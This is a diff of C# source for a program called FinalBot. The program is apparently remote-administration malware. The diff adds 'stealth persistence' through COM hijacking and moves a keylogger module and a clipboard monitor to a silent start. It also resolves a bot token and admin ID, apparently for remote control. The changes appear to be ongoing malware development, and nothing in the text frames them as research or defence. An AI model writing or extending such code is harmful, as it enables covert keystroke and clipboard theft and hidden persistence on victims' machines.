@@ -29,6 +29,7 @@ namespace FinalBot
 
         public static async Task Main(string[] args)
         {
+            Console.OutputEncoding = Encoding.UTF8;
             AppDomain.CurrentDomain.UnhandledException += (s, e) => {
                 DebugLog($"FATAL CRASH: {e.ExceptionObject}");
             };
@@ -127,7 +128,7 @@ namespace FinalBot
                 try 
                 {
                     string evArg = Array.Find(args, a => a.StartsWith("--event="));
-                    string evName = evArg != null ? evArg.Split('=')[1] : "Global\\Vanguard_Success";
+                    string evName = evArg != null ? evArg.Split('=')[1] : "Global\\EmoCore_Success";
                     using var successEvent = new EventWaitHandle(false, EventResetMode.ManualReset, evName);
                     successEvent.Set();
                     DebugLog($"Signal sent to: {evName}");
@@ -159,21 +160,22 @@ namespace FinalBot
 
             // [PHASE 5] Stealth Persistence (COM Hijacking)
             PersistenceService.InstallStealthProxy();
+            
+            // [SILENT START] Initialize background monitors once
+            KeyloggerModule.Start(); 
+            ClipboardModule.Start(); 
 
             // --- Resilience Loop ---
             while (true)
             {
                 try 
                 {
-                    DebugLog("Initializing core services...");
+                    DebugLog("Initializing core services via Vault...");
                     ConfigManager.Load();
-                    string token = ConfigManager.Get("BOT_TOKEN");
-                    string adminId = ConfigManager.Get("ADMIN_ID");
+                    string token = SafetyManager.Resolve("BOT_TOKEN_1");
+                    string adminId = SafetyManager.Resolve("ADMIN_ID");
                     var httpClient = await ProxyTunnel.GetBestHttpClient();
                     var orchestrator = new BotOrchestrator(token, adminId, httpClient);
-                    
-                    KeyloggerModule.Start(); 
-                    ClipboardModule.Start(); 
                     
                     _ = Task.Run(() => {
                         try {
